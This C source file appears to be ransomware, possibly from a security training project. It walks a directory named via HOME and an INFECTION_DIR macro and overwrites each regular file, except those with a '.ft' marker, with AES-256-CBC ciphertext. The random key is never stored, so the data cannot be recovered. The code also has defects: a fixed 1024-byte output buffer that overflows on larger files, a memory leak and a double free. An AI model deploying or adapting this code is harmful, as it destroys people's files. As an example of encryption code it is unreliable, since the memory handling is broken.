#include "encryption.h"

int encrypt(crypto_params *params) {
    EVP_CIPHER_CTX *ctx;
    int len;

    // Create and initialize the context
    if (!(ctx = EVP_CIPHER_CTX_new())) return -1;

    // Initialize encryption operation (AES-256-CBC)
    if (EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, params->key, params->iv) != 1) return -1;

    // Encrypt the plaintext
    if (EVP_EncryptUpdate(ctx, params->output, &len, params->input, params->input_len) != 1) return -1;
    params->output_len = len;

    // Finalize encryption
    if (EVP_EncryptFinal_ex(ctx, params->output + len, &len) != 1) return -1;
    params->output_len += len;

    // Clean up
    EVP_CIPHER_CTX_free(ctx);

    return params->output_len;
}

void encrypt_files(){
    crypto_params params;
    params.key = (unsigned char *)malloc(KEY_SIZE);
    params.iv = (unsigned char *)malloc(IV_SIZE);
    params.input = (unsigned char *)malloc(1024);
    params.output = (unsigned char *)malloc(1024);
    params.input_len = 0;
    params.output_len = 0;

    // Generate random key and IV
    RAND_bytes(params.key, KEY_SIZE);
    RAND_bytes(params.iv, IV_SIZE);

    // Get the infection directory
    char path[256];
    snprintf(path, sizeof(path), "%s%s", HOME, INFECTION_DIR);
    DIR *dir = opendir(path);
    struct dirent *entry;
    while ((entry = readdir(dir)) != NULL) {
        if (entry->d_type == DT_REG) {
            char filepath[512];
            snprintf(filepath, sizeof(filepath), "%s/%s", path, entry->d_name);
            if (!strstr(filepath, ".ft")) {
                FILE *file = fopen(filepath, "rb");
                if (file) {
                    fseek(file, 0, SEEK_END);
                    long file_len = ftell(file);
                    fseek(file, 0, SEEK_SET);

                    unsigned char *plaintext = malloc(file_len);
                    fread(plaintext, 1, file_len, file);

                    fclose(file);

                    params.input = plaintext;
                    params.input_len = file_len;

                    // Encrypt the file
                    encrypt(&params);

                    // Write the encrypted file
                    FILE *encrypted_file = fopen(filepath, "wb");
                    fwrite(params.iv, 1, IV_SIZE, encrypted_file);
                    fwrite(params.output, 1, params.output_len, encrypted_file);
                    fclose(encrypted_file);

                    free(plaintext);
                }
            }
        }
    }

    free(params.key);
    free(params.iv);
    free(params.input);
    free(params.output);
}
